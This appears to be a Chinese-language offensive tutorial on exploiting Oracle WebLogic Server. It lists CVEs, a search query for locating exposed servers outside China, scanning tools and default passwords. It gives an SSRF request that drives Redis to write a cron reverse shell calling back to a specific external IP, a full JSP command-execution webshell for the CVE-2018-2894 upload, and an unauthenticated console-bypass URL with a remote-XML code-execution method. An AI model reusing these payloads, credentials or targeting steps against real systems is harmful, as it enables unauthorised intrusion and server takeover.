# weblogic漏洞

### Weblogic简介

WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间，件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部署，和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java，Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

____



### Weblogic特征

~~~bash
默认端口：7001
Web界面：Error 404 -- Not Found
控制后台：http://ip:7001/console
~~~

___



###  Weblogic历史漏洞

| 漏洞类型            | CVE 编号        | 主要受影响版本                                             |
| ------------------- | --------------- | ---------------------------------------------------------- |
| SSRF                | CVE-2014-4210   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| 任意文件上传        | CVE-2018-2894   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| XMLDecoder 反序列化 | CVE-2017-3506   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| XMLDecoder 反序列化 | CVE-2017-10271  | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| XMLDecoder 反序列化 | CVE-2019-2725   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| XMLDecoder 反序列化 | CVE-2019-2729   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2015-4852   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2016-0638   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2016-3510   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2017-3248   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2018-2628   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2018-2893   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2020-2890   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2020-2555   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2020-14645  | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2020-14756  | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| Java 反序列化       | CVE-2021-2109   | 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2、12.2.1.3、14.1.1.0 |
| 弱口令              | Weblogic 弱口令 | 全版本通用                                                 |

___



### Weblogic历史漏洞发现

***fofa***

~~~bash
app="BEA-WebLogic-Server" && port==7001 && country!="CN"
~~~

***批量脚本、工具***

~~~bash
https://gitee.com/yijingsec/weblogicScanner

WeblogicTool_1.2.jar

LiqunKit
~~~

___



### Weblogic历史漏洞利用

#### WeakPassword

~~~bash
访问路径：/console
账号：weblogic
密码：Oracle@123

system/password
system/Passw0rd
weblogic/weblogic
admin/security
joe/password
mary/password
system/security
wlcsystem/wlcsystem
wlpisystem/wlpisystem

进后台 部署 安装 war包

http://you-ip/war包/xx.jsp
~~~

___

#### Weblogic_ssrf实例 CVE-2014-4210

***漏洞简介***

Weblogic 中存在一个服务器端请求伪造（SSRF）漏洞 ，SSRF 允许攻击者通过服务器向任意服务器发送，请求，这可能被用来攻击内部网络中的服务，比如 Redis、Fastcgi 等。漏洞产生于 ``/uddiexplorer/SearchPublicRegistries.jsp``页面中



***漏洞测试***

构造如下请求包发送

修改 operator 参数的URL地址为 http://127.0.0.1:7001

~~~bash
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: 192.168.81.111:7001
Content-Length: 170
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/125.0.0.0 Safari/537.36
Origin: http://192.168.81.111:7001
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/ap
ng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.81.111:7001/uddiexplorer/SearchPublicRegistries.jsp
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ib
m.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft
|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=2wxhmy4L25TQt
qp0jYhf4TP26GPMvR2qmFmsBZ5HsLy2bXZ5sFTp!-1442615718; JSESSIONID=nfmnmy4fRM1QKd1V3nq4L1zJ3JCq
GTJZvPpHnzhLmj7Gr78yrsBJ!-1442615718
Connection: close
operator=http%3A%2F%2F127.0.0.1:7001&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSear
chfor=&selfor=Business+location&btnSubmit=Search
~~~

因为目标是Weblogic服务，让Weblogic像本地主机的7001端口发送请求，也就相当于是直接访问 **靶机ip:7001**，那么本身就是会返回 404 Not found，那么说明这里是存在SSRF漏洞的



 ***内网主机存活探测***

1. 随机访问一个端口则会显示 could not connect 
2. 一个非http的协议则会返回did not have a valid SOAP
3. 不存活的主机就是 No route to host



**SSRF攻击内网Redis**

构造payload写定时任务

~~~bash
http://172.28.0.2:6379/test

set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'bash -i >& /dev/tcp/124.71.45.28/1234 0
>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save

aaa

（URL编码）编码网站：https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)
~~~

___

#### WebLogic未授权任意文件上传 CVE-2018-2894

在Weblogic Web Service Test Page中存在一处任意文件上传漏洞，利用该漏洞，可以上传任意 jsp文件，进而获取服务器权限。Web Service Test Page 在"生产模式"下默认不开启，所以该漏洞有一定限制。



该漏洞的影响模块为web服务测试页，在默认情况下不启用。

/ws_utc/config.do

/ws_utc/begin.do

启用方法：登录控制台-》base_domain-》高级-》勾选启用Web服务测试页 -》保存

通过测试，在10.3.6版本上未发现该功能

能访问**/ws_utc/config.do**目录说明，存在此漏洞



访问http://your-ip:7001/ws_utc/config.do，设置Work Home Dir为:

~~~bash
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracl
e.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
~~~

点击提交，将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。

点击安全，添加，在Keystore文件处，上传Webshell，提交，在响应中会返回时间戳：



**一句话jsp**

~~~bash
<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); String output =
""; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); Buf
feredReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = s
I.readLine()) != null) { output += s +"\r\n"; } } catch(IOException e) { e.printStackTrace
(); } } out.println(output);%>
~~~



**访问Webshell**

~~~bash
http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]
~~~

____



#### CVE-2019-2725

A. 漏洞描述

由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意xml  HTTP 请求去下载getshell文件，利用该漏洞获取服务器权限，实现远程代码执行,



B. 影响版本

Oracle WebLogic Server 10.*

Oracle WebLogic Server 12.1.3



C. 影响组件

bea_wls9_async_response.war：/_async/AsyncResponseService

wsat.war：/wls-wsat/CoordinatorPortType



D. 漏洞判断

判断不安全组件是否开启

1. 通过访问路径 /_async/AsyncResponseService 判断对应组件是否开启
2. 通过访问路径 /wls-wsat/CoordinatorPortType 判断对应组件是否开启



G. 漏洞修复

升级本地JDK版本

配置URL访问控制策略

删除不安全文件

____

#### CVE-2020-14882&CVE-2020-14883

A. 漏洞描述

Weblogic 管理控制台未授权远程命令执行漏洞

CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台；

CVE-2020-14883：允许后台任意用户通过HTTP协议执行任意命令

使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执

行命令。

B. 影响范围

~~~bash
WebLogic 10.3.6.0
WebLogic 12.1.3.0
WebLogic 12.2.1.3
WebLogic 12.2.1.4
WebLogic 14.1.1.0
~~~

D. 漏洞复现



 **CVE-2020-14882**判断是否存在CVE-2020-14882未授权访问漏洞

~~~bash
http://you-ip/console/css/%252e%252e%252fconsole.portal
~~~



**CVE-2020-14883**

A 

通过 **com.tangosol.coherence.mvel2.sh.ShellSession** 执行系统命令反弹shell

这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession 类



B

一种更为通杀的方法，最早在 CVE-2019-2725 被提出，对于所有Weblogic版本均有效。

构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如 http://example.com/rce.xml

然后让Weblogic加载XML并执行其中的命令 反弹shel

前提条件：需要 Weblogic 的服务器能够访问到恶意XML。

